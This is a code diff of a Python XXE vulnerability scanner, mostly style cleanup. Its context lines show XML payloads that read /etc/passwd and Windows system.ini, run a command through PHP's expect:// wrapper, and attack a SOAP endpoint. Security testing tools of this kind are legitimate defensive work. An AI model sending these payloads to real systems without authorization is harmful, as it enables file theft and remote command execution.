@@ -5,11 +5,10 @@ OWASP A05:2021 - Security Misconfiguration
 檢測 XML 解析器的外部實體注入漏洞
 """
 
-import time
-from typing import List, Optional
 from dataclasses import dataclass
+import time
+
 import requests
-from lxml import etree
 
 
 @dataclass
@@ -22,7 +21,7 @@ class XXEFinding:
     severity: str
     owasp: str
     success: bool
-    response_time_ms: Optional[int] = None
+    response_time_ms: int | None = None
 
 
 class XXEDetector:
@@ -40,18 +39,18 @@ class XXEDetector:
         self.timeout = timeout
         self.payloads = self._generate_payloads()
     
-    def _generate_payloads(self) -> List[str]:
+    def _generate_payloads(self) -> list[str]:
         """生成 XXE payloads"""
         return [
             # 基礎 XXE (文件讀取)
-            f'''<?xml version="1.0"?>
+            '''<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <foo>&xxe;</foo>''',
             
             # Windows 文件讀取
-            f'''<?xml version="1.0"?>
+            '''<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">
 ]>
@@ -75,14 +74,14 @@ class XXEDetector:
 <foo>&send;</foo>''',
             
             # PHP Expect
-            f'''<?xml version="1.0"?>
+            '''<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "expect://id">
 ]>
 <foo>&xxe;</foo>''',
             
             # 內部 DTD Trick (Java)
-            f'''<?xml version="1.0"?>
+            '''<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
   <!ENTITY % ISOamso '
@@ -96,7 +95,7 @@ class XXEDetector:
 <foo>test</foo>''',
         ]
     
-    def test_xxe(self, url: str, param: str, method: str = 'POST') -> List[XXEFinding]:
+    def test_xxe(self, url: str, param: str, method: str = 'POST') -> list[XXEFinding]:
         """
         測試 XXE 漏洞
         
@@ -285,7 +284,7 @@ class XXEDetector:
         
         return False, "", ""
     
-    def test_with_soap(self, url: str) -> List[XXEFinding]:
+    def test_with_soap(self, url: str) -> list[XXEFinding]:
         """
         測試 SOAP 端點的 XXE
         
@@ -298,7 +297,7 @@ class XXEDetector:
         findings = []
         
         # SOAP XXE payload
-        soap_payload = f'''<?xml version="1.0"?>
+        soap_payload = '''<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
@@ -334,7 +333,7 @@ class XXEDetector:
                     success=True
                 ))
                 
-        except Exception as e:
+        except Exception:
             pass
         
         return findings
